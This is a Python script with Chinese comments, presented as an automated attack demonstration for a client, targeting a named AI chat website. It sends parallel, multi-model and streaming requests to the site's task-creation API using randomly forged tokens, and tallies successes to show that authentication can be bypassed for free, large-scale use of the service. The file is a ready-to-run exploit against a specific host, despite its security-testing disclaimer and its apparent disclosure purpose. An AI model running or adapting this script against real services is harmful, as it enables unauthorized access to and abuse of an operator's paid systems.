#!/usr/bin/env python3
"""
iwoozie.baby AI聊天系统 - 自动化攻击演示脚本
用于向甲方展示系统漏洞的严重性和攻击的可行性
"""

import requests
import time
import random
import threading
from concurrent.futures import ThreadPoolExecutor
import json

class AutomatedAttackDemo:
    def __init__(self):
        self.base_url = "https://iwoozie.baby"
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive'
        })
        self.successful_attacks = 0
        self.failed_attacks = 0
        
    def generate_fake_token(self):
        """生成随机伪造token"""
        return f"fake_token_{random.randint(100000, 999999)}_{random.randint(1000, 9999)}"
    
    def single_attack(self, attack_id, model="GPT-4"):
        """执行单次攻击"""
        try:
            token = self.generate_fake_token()
            url = f"{self.base_url}/api/quick/createAITask?model={model}"
            
            headers = {
                'Content-Type': 'application/json',
                'x-api-key': token,
                'Authorization': f'Bearer {token}',
                'x-auth-token': token
            }
            
            data = {
                "Content": [{
                    "role": "user", 
                    "content": f"Attack #{attack_id}: Generate content for security testing"
                }]
            }
            
            response = self.session.post(url, json=data, headers=headers, timeout=10)
            
            if response.status_code == 200:
                result = response.json()
                if result.get('code') == 200:
                    self.successful_attacks += 1
                    print(f"✅ 攻击 #{attack_id} 成功 - 模型: {model}")
                    return True
                else:
                    self.failed_attacks += 1
                    print(f"❌ 攻击 #{attack_id} 失败 - 响应: {result.get('error', 'Unknown error')}")
            else:
                self.failed_attacks += 1
                print(f"❌ 攻击 #{attack_id} 失败 - HTTP {response.status_code}")
                
        except Exception as e:
            self.failed_attacks += 1
            print(f"❌ 攻击 #{attack_id} 异常 - {str(e)}")
        
        return False
    
    def multi_model_attack(self, attack_id):
        """多模型攻击"""
        models = ["GPT-4", "Gemini-2.5-Pro", "Grok-4-Fast"]
        results = []
        
        for model in models:
            try:
                token = self.generate_fake_token()
                url = f"{self.base_url}/api/quick/createAITask?model={model}"
                
                headers = {
                    'Content-Type': 'application/json',
                    'x-api-key': token
                }
                
                data = {
                    "Content": [{
                        "role": "user", 
                        "content": f"Multi-model attack #{attack_id} using {model}"
                    }]
                }
                
                response = self.session.post(url, json=data, headers=headers, timeout=10)
                
                if response.status_code == 200:
                    result = response.json()
                    if result.get('code') == 200:
                        results.append(f"✅ {model}: 成功")
                        self.successful_attacks += 1
                    else:
                        results.append(f"❌ {model}: {result.get('error', 'Unknown error')}")
                        self.failed_attacks += 1
                else:
                    results.append(f"❌ {model}: HTTP {response.status_code}")
                    self.failed_attacks += 1
                    
            except Exception as e:
                results.append(f"❌ {model}: {str(e)}")
                self.failed_attacks += 1
        
        print(f"攻击 #{attack_id} 多模型结果: {' | '.join(results)}")
        return any("✅" in result for result in results)
    
    def stream_attack(self, attack_id):
        """流式响应攻击"""
        try:
            token = self.generate_fake_token()
            url = f"{self.base_url}/api/quick/createAITask?model=GPT-4&stream=true"
            
            headers = {
                'Content-Type': 'application/json',
                'x-api-key': token
            }
            
            data = {
                "Content": [{
                    "role": "user", 
                    "content": f"Stream attack #{attack_id}: Generate a long response"
                }]
            }
            
            response = self.session.post(url, json=data, headers=headers, timeout=15, stream=True)
            
            if response.status_code == 200:
                print(f"✅ 流式攻击 #{attack_id} 开始接收数据...")
                chunk_count = 0
                for chunk in response.iter_lines():
                    if chunk:
                        chunk_count += 1
                        if chunk_count <= 3:  # 只显示前3个chunk
                            print(f"   数据块: {chunk.decode('utf-8')[:100]}...")
                
                print(f"✅ 流式攻击 #{attack_id} 完成 - 接收了 {chunk_count} 个数据块")
                self.successful_attacks += 1
                return True
            else:
                print(f"❌ 流式攻击 #{attack_id} 失败 - HTTP {response.status_code}")
                self.failed_attacks += 1
                
        except Exception as e:
            print(f"❌ 流式攻击 #{attack_id} 异常 - {str(e)}")
            self.failed_attacks += 1
        
        return False
    
    def run_parallel_attacks(self, num_attacks=10, max_workers=5):
        """并行攻击测试"""
        print(f"\n🚀 开始并行攻击测试 - {num_attacks} 次攻击，{max_workers} 个并发线程")
        print("=" * 60)
        
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            # 提交攻击任务
            futures = []
            for i in range(num_attacks):
                future = executor.submit(self.single_attack, i+1)
                futures.append(future)
            
            # 等待所有攻击完成
            for future in futures:
                future.result()
        
        print("\n" + "=" * 60)
        print("📊 并行攻击结果统计")
        print("=" * 60)
        print(f"总攻击次数: {num_attacks}")
        print(f"成功攻击: {self.successful_attacks}")
        print(f"失败攻击: {self.failed_attacks}")
        print(f"成功率: {(self.successful_attacks / num_attacks) * 100:.1f}%")
    
    def run_multi_model_attacks(self, num_attacks=5):
        """多模型攻击测试"""
        print(f"\n🎯 开始多模型攻击测试 - {num_attacks} 次攻击")
        print("=" * 60)
        
        for i in range(num_attacks):
            self.multi_model_attack(i+1)
            time.sleep(0.5)  # 避免过于频繁的请求
        
        print("\n" + "=" * 60)
        print("📊 多模型攻击结果统计")
        print("=" * 60)
        print(f"总攻击次数: {num_attacks * 3}")  # 3个模型
        print(f"成功攻击: {self.successful_attacks}")
        print(f"失败攻击: {self.failed_attacks}")
        print(f"成功率: {(self.successful_attacks / (num_attacks * 3)) * 100:.1f}%")
    
    def run_stream_attacks(self, num_attacks=3):
        """流式攻击测试"""
        print(f"\n🌊 开始流式攻击测试 - {num_attacks} 次攻击")
        print("=" * 60)
        
        for i in range(num_attacks):
            self.stream_attack(i+1)
            time.sleep(1)  # 流式请求需要更多时间
        
        print("\n" + "=" * 60)
        print("📊 流式攻击结果统计")
        print("=" * 60)
        print(f"总攻击次数: {num_attacks}")
        print(f"成功攻击: {self.successful_attacks}")
        print(f"失败攻击: {self.failed_attacks}")
        print(f"成功率: {(self.successful_attacks / num_attacks) * 100:.1f}%")
    
    def run_full_demo(self):
        """运行完整演示"""
        print("🔓 iwoozie.baby AI聊天系统 - 自动化攻击演示")
        print("=" * 60)
        print("⚠️  警告: 此演示仅用于安全测试目的")
        print("⚠️  请勿用于恶意攻击或非法活动")
        print("=" * 60)
        
        # 重置计数器
        self.successful_attacks = 0
        self.failed_attacks = 0
        
        # 1. 并行攻击测试
        self.run_parallel_attacks(num_attacks=10, max_workers=5)
        
        # 2. 多模型攻击测试
        self.run_multi_model_attacks(num_attacks=5)
        
        # 3. 流式攻击测试
        self.run_stream_attacks(num_attacks=3)
        
        # 最终统计
        print("\n" + "=" * 60)
        print("🎯 最终攻击结果统计")
        print("=" * 60)
        total_attacks = self.successful_attacks + self.failed_attacks
        success_rate = (self.successful_attacks / total_attacks) * 100 if total_attacks > 0 else 0
        
        print(f"总攻击次数: {total_attacks}")
        print(f"成功攻击: {self.successful_attacks}")
        print(f"失败攻击: {self.failed_attacks}")
        print(f"总体成功率: {success_rate:.1f}%")
        
        if success_rate > 50:
            print("\n🚨 严重安全漏洞确认!")
            print("系统存在严重的安全问题，攻击者可以:")
            print("1. 绕过前端验证系统")
            print("2. 无限制访问AI服务")
            print("3. 进行大规模服务滥用")
            print("4. 获取敏感AI响应数据")
            print("\n建议立即修复此漏洞!")
        else:
            print("\n✅ 系统安全状况良好")
            print("大部分攻击被成功阻止")

if __name__ == "__main__":
    demo = AutomatedAttackDemo()
    demo.run_full_demo()
